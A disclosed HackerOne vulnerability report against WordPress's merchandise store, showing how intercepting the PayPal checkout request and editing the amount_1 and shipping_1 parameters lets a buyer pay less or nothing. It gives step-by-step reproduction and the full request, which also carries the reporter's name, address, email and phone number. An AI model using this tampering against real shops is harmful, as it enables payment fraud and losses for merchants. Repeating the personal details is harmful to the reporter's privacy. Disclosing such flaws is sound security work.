# Parameter tampering : Price Manipulation of Products

## Report Details
- **Report ID**: 682344
- **URL**: https://hackerone.com/reports/682344
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-08-26T19:17:18.147Z
- **Disclosed**: 2019-08-29T15:39:07.475Z

## Reporter
- **Username**: ashketchum
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hello Security Team,
I have found that you can buy any products in less amount or even we can say as free by changing the price of the product!!

POC : 
1) go to https://mercantile.wordpress.org/
2) choose any product and add to cart
3) Now go to cart add your billing details 
4) Intercept request with burpsuite and click on Proceed to Paypal
5) You will get the following request

REQUEST :

GET /cgi-bin/webscr?cmd=_cart&business=payments%40hellomerch.com&no_note=1&currency_code=USD&charset=utf-8&rm=2&upload=1&return=https%3A%2F%2Fmercantile.wordpress.org%2Fcheckout%2Forder-received%2F10446%2F%3Fkey%3Dwc_order_5d642e2e80f33%26utm_nooverride%3D1&cancel_return=https%3A%2F%2Fmercantile.wordpress.org%2Fcart%2F%3Fcancel_order%3Dtrue%26order%3Dwc_order_5d642e2e80f33%26order_id%3D10446%26redirect%26_wpnonce%3Def9aba5f0f&page_style=&image_url=&paymentaction=sale&bn=WooThemes_Cart&invoice=WP-10446&custom=%7B%22order_id%22%3A10446%2C%22order_key%22%3A%22wc_order_5d642e2e80f33%22%7D&notify_url=https%3A%2F%2Fmercantile.wordpress.org%2Fwc-api%2FWC_Gateway_Paypal%2F&first_name=ASHISH&last_name=DHONE&address1=I2IT+BOYS+HOSTEL+HINJAWADI+OPPOSITE+SYMBIOSIS+COLLEGE&address2=xss&city=PUNE&state=Maharashtra&zip=411057&country=IN&email=ha5ckdangerous5%40gmail.com&night_phone_b=7385711194&no_shipping=1&tax_cart=0.00&shipping_1=<<VULNERABLE PARAMETER>>&item_name_1=WordCamp+US+2018+T-Shirt+-+Women%27s+SM&quantity_1=1&amount_1=<<VULNERABLE PARAMETER>>&item_number_1=WP-WORDCAMPUS2018NAVY-WSM-05-106-B HTTP/1.1
Host: www.paypal.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://mercantile.wordpress.org/checkout/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7


Now here in this request we have two VULNERABLE PARAMETER as :
1) shipping_1
2) amount_1

Now you change amount to this parameter and forward the request .. you will be able to order the product for less price or even Free using Paypal !!

I have attached POC Video, Please take a look!!

Thank You!!
Ashish Dhone

## Impact

The attacker can reduce the price of the order and make a financial loss!!

## Attachments
- POC.mkv
